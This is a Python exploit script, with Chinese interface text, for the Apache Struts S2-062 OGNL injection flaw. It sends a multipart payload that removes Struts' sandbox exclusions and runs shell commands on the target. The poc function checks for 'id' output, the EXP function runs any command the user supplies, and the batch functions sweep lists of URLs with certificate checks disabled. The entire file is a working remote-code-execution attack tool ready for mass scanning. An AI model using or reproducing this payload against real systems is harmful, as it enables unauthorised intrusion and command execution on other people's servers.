import requests
from lxml import etree
import argparse

def poc(url):
    try:
        headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8", "Connection": "close", "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF"}
        data = "------WebKitFormBoundaryl7d1B1aGsV2wcZwF\r\nContent-Disposition: form-data; name=\"id\"\r\n\r\n%{\r\n(#request.map=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +\r\n(#request.map.setBean(#request.get('struts.valueStack')) == true).toString().substring(0,0) +\r\n(#request.map2=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +\r\n(#request.map2.setBean(#request.get('map').get('context')) == true).toString().substring(0,0) +\r\n(#request.map3=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +\r\n(#request.map3.setBean(#request.get('map2').get('memberAccess')) == true).toString().substring(0,0) +\r\n(#request.get('map3').put('excludedPackageNames',#@org.apache.commons.collections.BeanMap@{}.keySet()) == true).toString().substring(0,0) +\r\n(#request.get('map3').put('excludedClasses',#@org.apache.commons.collections.BeanMap@{}.keySet()) == true).toString().substring(0,0) +\r\n(#application.get('org.apache.tomcat.InstanceManager').newInstance('freemarker.template.utility.Execute').exec({'id'}))\r\n}\r\n------WebKitFormBoundaryl7d1B1aGsV2wcZwF\xe2\x80\x94"
        text=requests.post(url, headers=headers, data=data, verify=False, timeout=6).text
        if "uid=" in text and ") gid=" in text and ") groups=" in text:
            print("发现漏洞")
            page=etree.HTML(text)
            data = page.xpath('//a[@id]/@id')
            print(data[0])
    except:
        print("POC检测失败")

def batchpoc(lst):
    with open(lst) as f:
        for line in f.readlines():
            url = line.strip('\n')
            if "http" != url[:4]:
                url = "http://"+url
            print(url+":")
            poc(url)


def EXP(url,cmd):
    try:
        headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8", "Connection": "close", "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF"}
        data ="------WebKitFormBoundaryl7d1B1aGsV2wcZwF\r\nContent-Disposition: form-data; name=\"id\"\r\n\r\n%{\r\n(#request.map=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +\r\n(#request.map.setBean(#request.get('struts.valueStack')) == true).toString().substring(0,0) +\r\n(#request.map2=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +\r\n(#request.map2.setBean(#request.get('map').get('context')) == true).toString().substring(0,0) +\r\n(#request.map3=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +\r\n(#request.map3.setBean(#request.get('map2').get('memberAccess')) == true).toString().substring(0,0) +\r\n(#request.get('map3').put('excludedPackageNames',#@org.apache.commons.collections.BeanMap@{}.keySet()) == true).toString().substring(0,0) +\r\n(#request.get('map3').put('excludedClasses',#@org.apache.commons.collections.BeanMap@{}.keySet()) == true).toString().substring(0,0) +\r\n(#application.get('org.apache.tomcat.InstanceManager').newInstance('freemarker.template.utility.Execute').exec({'id'}))\r\n}\r\n------WebKitFormBoundaryl7d1B1aGsV2wcZwF\xe2\x80\x94".replace("exec({'id","exec({'"+cmd)
        text=requests.post(url, headers=headers, data=data, verify=False, timeout=6).text
        if "id" in text:
            print("命令回显")
            page=etree.HTML(text)
            data = page.xpath('//a[@id]/@id')
            print(data[0])
    except:
        print("EXP检测失败")

def batchEXP(lst,cmd):
    with open(lst) as f:
        for line in f.readlines():
            url = line.strip('\n')
            if "http" != url[:4]:
                url = "http://"+url
            print(url+":")
            EXP(url,cmd)

if __name__ == '__main__':
    requests.packages.urllib3.disable_warnings()
    parser = argparse.ArgumentParser(description='S2-062验证')
    parser.add_argument('--list', help="要验证的URL清单，保存为txt格式",default="")
    parser.add_argument('--url', help="要验证的URL",default="")
    parser.add_argument('--cmd',help="你想执行的命令",default="")
    args = parser.parse_args()
    if args.cmd !="":
        if args.url != "" and args.list == "":
            EXP(args.url,args.cmd)
        elif args.url == "" and args.list != "":
            batchEXP(args.list,args.cmd)
        else:
            print("请检查参数")
            print(args)
    else:
        if args.url != "" and args.list == "":
            poc(args.url)
        elif args.url == "" and args.list != "":
            batchpoc(args.list)
        else:
            print("请检查参数")
            print(args)